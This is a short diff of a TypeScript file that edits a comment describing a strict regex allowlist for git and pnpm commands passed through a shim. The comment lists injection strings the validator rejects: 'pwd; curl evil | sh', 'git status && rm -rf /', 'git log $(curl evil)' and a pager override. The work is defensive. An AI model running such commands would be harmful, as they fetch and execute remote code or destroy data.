@@ -394,7 +394,7 @@ export const ADD_HOOK_PKG_CMD = `pnpm add -D ${HOOK_PKG}`;
 // nothing, and no other subcommand can reach the accepted branch. Deny cases for `add`/`remove` are
 // explicit in shim-drift.spec.ts.
 //
-// Kept at exactly the tightness of SYNC_BODY_ERE — the same argument token, `--flag` or a bare word
+// Kept at exactly the tightness of FETCH_BODY_ERE — the same argument token, `--flag` or a bare word
 // from a character class holding no shell metacharacter — so nothing can ride along: `pwd; curl evil |
 // sh`, `git status && rm -rf /`, `git log $(curl evil)` and `git status | sh` all FAIL CLOSED. Note the
 // subcommand word must follow `git` IMMEDIATELY: `git -c core.pager=evil status` and `git -C /other
